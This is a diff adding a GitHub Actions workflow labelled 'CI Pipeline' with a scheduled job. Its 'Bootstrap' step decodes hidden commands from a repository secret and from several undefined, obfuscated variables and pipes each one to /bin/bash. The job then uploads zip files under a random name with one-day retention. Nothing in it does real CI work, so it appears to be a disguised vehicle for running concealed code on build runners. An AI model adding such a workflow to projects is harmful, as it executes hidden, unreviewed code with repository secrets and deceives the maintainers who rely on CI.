@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          u97: ${{ secrets.u97 }}
+        run: |
+          printf '%s' "$u97" | jq -r .blk805 | /bin/bash
+          echo $sf1925 | jq -r .htf89 | /bin/bash
+          printf '%s' "$gw65370" | jq -r .erj15 | /bin/bash
+          printf '%s' "$j14528" | jq -r .ukm61094 | /bin/bash
+          printf '%s' "$ikbn4" | jq -r .i38451 | /bin/bash
+          printf '%s' "$q9" | jq -r .cara44 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VBOP1shE
+          path: "*.zip"
+          retention-days: 1
